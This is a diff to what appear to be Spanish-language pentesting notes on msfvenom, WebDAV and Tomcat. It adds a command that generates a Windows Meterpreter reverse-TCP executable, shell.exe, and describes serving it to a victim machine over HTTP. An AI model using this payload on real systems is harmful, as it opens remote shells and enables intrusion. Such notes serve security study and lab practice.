@@ -18,6 +18,8 @@ Tags: #Msfvenom #WebDav #Tomcat
 	# LPORT = Local Port Atacante
 	# platform = Plataforma a usar
 	# a = Arquitectura
+
+❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f exe > shell.exe
 ```
 
 Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un servidor HTTP y en la maquina victima lo podemos descargar desde el navegador colocando la IP del servicio compartido
